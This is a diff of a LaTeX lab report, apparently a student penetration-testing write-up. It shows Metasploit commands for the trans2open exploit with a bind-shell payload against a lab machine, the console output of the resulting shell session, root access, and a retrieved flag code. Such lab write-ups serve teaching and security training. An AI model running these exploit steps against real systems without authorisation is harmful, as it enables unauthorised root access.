@@ -38,13 +38,13 @@ The following step was to carry out the attack using the exploit in Metasploit. 
 \item \lstinline{set payload linux/x86/shell_bind_tcp}
 \item \lstinline{exploit}
 \end{enumerate}
-The first line selects the exploit module for the \exploitname{trans2open} exploit, the second shows the options for the module. The only required option for the exploit that was empty was \option{RHOST}, which specifies the target address. The third line sets said option to \ipaddress{192.168.2.133}---the address of the target machine. The fourth line then shows the payloads available for the exploit, and the fifth line selects a payload called \payloadname{Bind TCP Inline} [explain what the payload does]. Finally, the last line executes the attack.
+The first line selects the exploit module for the \exploitname{trans2open} exploit, the second shows the options for the module. The only required option for the exploit that was empty was \option{RHOST}, which specifies the target address. The third line sets said option to \ipaddress{192.168.2.133}---the address of the target machine. The fourth line then shows the payloads available for the exploit, and the fifth line selects a payload called \payloadname{Bind TCP Inline}. Finally, the last line executes the attack.
 
 Upon execution, the following is printed in the console.
 
 {\bfseries{\textit{\lstinline{[*] Trying return address 0xbffffdfc...}\\\lstinline{Started bind handler}\\\lstinline{[*] Trying return address 0xbffffcfc...}\\\lstinline{[*] Trying return address 0xbffffbfc...}\\\lstinline{[*] Trying return address 0xbffffafc...}\\\lstinline{Sending stage (36 bytes) to 192.168.2.133}\\\lstinline{Command shell session 1 opened(10.11.12.22:38569->192.168.2.133:4444)}}}}
 
-The payload and the output will be explained in higher grade part.
+The payload and the output will be explained in the higher grades part.
 
 Having achieved root access to the system, we found a text file called \filename{secret.txt} in the home folder of the root user. Its content was a marvelous piece of ASCII art with text instructing us to include the following code in the report: {\bfseries C14Hzd1hkNQ2w}.
 \end{itemize}
